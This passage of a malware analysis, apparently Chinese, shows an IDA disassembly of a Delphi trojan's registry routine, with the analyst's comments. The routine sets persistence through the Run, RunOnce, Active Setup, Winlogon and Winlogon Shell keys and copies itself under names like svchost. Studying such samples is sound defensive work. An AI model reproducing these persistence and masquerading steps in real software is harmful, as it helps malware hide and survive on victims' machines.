
``` 
  CODE:00433797                 mov     ecx, ds:off\_4360F0

  CODE:0043379D                 mov     ecx, [ecx]

  CODE:0043379F                 lea     eax, [ebp+var\_8]

  CODE:004337A2                 mov     edx, offset s->SoftwareMicrosoftActiveSetupInstalledComponents\_0 ; "SOFTWARE\\Microsoft\\Active Setup\\Install"...

  CODE:004337A7                 call    System::\_\_linkproc\_\_ LStrCat3(void)

  CODE:004337A7

  CODE:004337AC                 mov     edx, [ebp+var\_8]

  CODE:004337AF                 mov     eax, HKEY\_CURRENT\_USER

  CODE:004337B4                 call    \_Delete\_RegKey

  CODE:004337B4

  CODE:004337B9

  CODE:004337B9 loc\_4337B9:                             ; CODE XREF: \_Set\_Reg\_Info+39j

  CODE:004337B9                 lea     edx, [ebp+var\_C]

  CODE:004337BC                 mov     eax, 1

  CODE:004337C1                 call    System::ParamStr(int)

  CODE:004337C1

  CODE:004337C6                 mov     eax, [ebp+var\_C]

  CODE:004337C9                 mov     edx, offset s->Reactivaterunonce ; "/reactivateRunOnce"

  CODE:004337CE                 call    System::\_\_linkproc\_\_ **LStrCmp**(void)

  CODE:004337CE

  CODE:004337D3                 jnz     short loc\_433814

  CODE:004337D3

  CODE:004337D5                 push    offset dword\_433918

  CODE:004337DA                 lea     edx, [ebp+var\_14]

  CODE:004337DD                 xor     eax, eax

  CODE:004337DF                 call    System::ParamStr(int)

  CODE:004337DF

  CODE:004337E4                 push    [ebp+var\_14]

  CODE:004337E7                 push    offset dword\_433918

  CODE:004337EC                 lea     eax, [ebp+var\_10]

  CODE:004337EF                 mov     edx, 3

  CODE:004337F4                 call    System::\_\_linkproc\_\_ LStrCatN(void)

  CODE:004337F4

  CODE:004337F9                 mov     eax, [ebp+var\_10]

  CODE:004337FC                 push    eax

  CODE:00433803                 mov     ecx, ds:off\_436270

  CODE:00433805                 mov     ecx, [ecx]

  CODE:00433805                 mov     edx, offset s->SoftwareMicrosoftWindowsCurrentversionRunonce\_0 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...

  CODE:0043380A                 mov     eax, HKEY\_LOCAL\_MACHINE

  CODE:0043380F                 call    \_Create\_RegKey

  CODE:0043380F

  CODE:00433814

  CODE:00433814 loc\_433814:                             ; CODE XREF: \_Set\_Reg\_Info+77j

  CODE:00433814                 cmp     byte ptr [ebx], 1

  CODE:00433817                 jnz     short loc\_433825

  CODE:00433817

  CODE:00433819                 mov     eax, ds:off\_4361AC ; 解码后配置文件的相关内容地址送EAX

  CODE:0043381E                 mov     eax, [eax]      ; 获取解码后配置文件的相关内容，这里是 svchost

  CODE:00433820                 call    \_Create\_Run\_RegKey

  CODE:00433820

  CODE:00433825

  CODE:00433825 loc\_433825:                             ; CODE XREF: \_Set\_Reg\_Info+BBj

  CODE:00433825                 cmp     byte ptr [ebx+1], 1

  CODE:00433829                 jnz     short loc\_433837

  CODE:00433829

  CODE:0043382B                 mov     eax, ds:off\_436270

  CODE:00433830                 mov     eax, [eax]

  CODE:00433832                 call    \_Create\_RunOnce\_RegKey

  CODE:00433832

  CODE:00433837

  CODE:00433837 loc\_433837:                             ; CODE XREF: \_Set\_Reg\_Info+CDj

  CODE:00433837                 cmp     byte ptr [ebx+2], 1

  CODE:0043383B                 jnz     short loc\_433849

  CODE:0043383B

  CODE:0043383D                 mov     eax, ds:off\_4360F0

  CODE:00433842                 mov     eax, [eax]      ; 解码后配置文件中的“{4fz8rk-15aq-16nc-23or4-2ke0fa051515}”字串送EAX

  CODE:00433844                 call    \_Create\_Component\_RegKey

  CODE:00433844

  CODE:00433849

  CODE:00433849 loc\_433849:                             ; CODE XREF: \_Set\_Reg\_Info+DFj

  CODE:00433849                 cmp     byte ptr [ebx+3], 1

  CODE:0043384D                 jnz     short loc\_43385B

  CODE:0043384D

  CODE:0043384F                 mov     eax, ds:off\_436044

  CODE:00433854                 mov     eax, [eax]      ; 这里为解码后配置文件中的字串 pschost

  CODE:00433856                 call    \_Create\_Dir\_and\_CopyFile

  CODE:00433856

  CODE:0043385B

  CODE:0043385B loc\_43385B:                             ; CODE XREF: \_Set\_Reg\_Info+F1j

  CODE:0043385B                 cmp     byte ptr [ebx+4], 1

  CODE:0043385F                 jnz     short loc\_433866

  CODE:0043385F

  CODE:00433861                 call    \_Create\_Winlogon\_RegKey

  CODE:00433861

  CODE:00433866

  CODE:00433866 loc\_433866:                             ; CODE XREF: \_Set\_Reg\_Info+103j

  CODE:00433866                 cmp     byte ptr [ebx+5], 1

  CODE:0043386A                 jnz     short loc\_433871

  CODE:0043386A

  CODE:0043386C                 call    \_Create\_Winlogon\_Shell\_RegKey

  CODE:0043386C

  CODE:00433871

  CODE:00433871 loc\_433871:                             ; CODE XREF: \_Set\_Reg\_Info+10Ej

  CODE:00433871                 xor     eax, eax

  CODE:00433873                 pop     edx

  CODE:00433874                 pop     ecx

  CODE:00433875                 pop     ecx

  CODE:00433876                 mov     fs:[eax], edx

  CODE:00433879                 push    offset loc\_433893

  CODE:00433879

  CODE:0043387E

  CODE:0043387E loc\_43387E:                             ; CODE XREF: \_Set\_Reg\_Info+135j

  CODE:0043387E                 lea     eax, [ebp+var\_14]

  CODE:00433881                 mov     edx, 5

  CODE:00433886                 call    System::\_\_linkproc\_\_ LStrArrayClr(void \*,int)

  CODE:00433886

  CODE:0043388B                 retn

  CODE:0043388B

  CODE:0043388C ; ---------------------------------------------------------------------------

  CODE:0043388C

  CODE:0043388C loc\_43388C:                             ; DATA XREF: \_Set\_Reg\_Info+14o

  CODE:0043388C                 jmp     unknown\_libname\_48 ; BDS 2005-2006 and Delphi6-7 Visual Component Library

  CODE:0043388C

  CODE:00433891 ; ---------------------------------------------------------------------------

  CODE:00433891                 jmp     short loc\_43387E

  CODE:00433891

  CODE:00433893 ; ---------------------------------------------------------------------------

  CODE:00433893

  CODE:00433893 loc\_433893:                             ; CODE XREF: \_Set\_Reg\_Info+12Fj

  CODE:00433893                                         ; DATA XREF: \_Set\_Reg\_Info+11Do

  CODE:00433893                 pop     ebx

  CODE:00433894                 mov     esp, ebp

  CODE:00433896                 pop     ebp

  CODE:00433897                 retn

  CODE:00433897

  CODE:00433897 \_Set\_Reg\_Info   endp

  其中的

  CODE:00433856                 call    \_Create\_Dir\_and\_CopyFile

  是用来创建文件的。到这个 CALL 里看看：

  CODE:00414C34 \_Create\_Dir\_and\_CopyFile proc near      ; CODE XREF: \_Set\_Reg\_Info+FAp

  CODE:00414C34

  CODE:00414C34 var\_20          = dword ptr -20h

  CODE:00414C34 var\_1C          = dword ptr -1Ch

  CODE:00414C34 var\_18          = dword ptr -18h

  CODE:00414C34 var\_14          = dword ptr -14h

  CODE:00414C34 var\_10          = dword ptr -10h

  CODE:00414C34 var\_C           = dword ptr -0Ch

  CODE:00414C34 var\_8           = dword ptr -8

  CODE:00414C34 var\_4           = dword ptr -4

  CODE:00414C34

  CODE:00414C34                 push    ebp

  CODE:00414C35                 mov     ebp, esp

  CODE:00414C37                 xor     ecx, ecx

  CODE:00414C39                 push    ecx

  CODE:00414C3A                 push    ecx

  CODE:00414C3B                 push    ecx

  CODE:00414C3C                 push    ecx

  CODE:00414C3D                 push    ecx

  CODE:00414C3E                 push    ecx

  CODE:00414C3F                 push    ecx

  CODE:00414C40                 push    ecx

  CODE:00414C41                 mov     [ebp+var\_4], eax
```
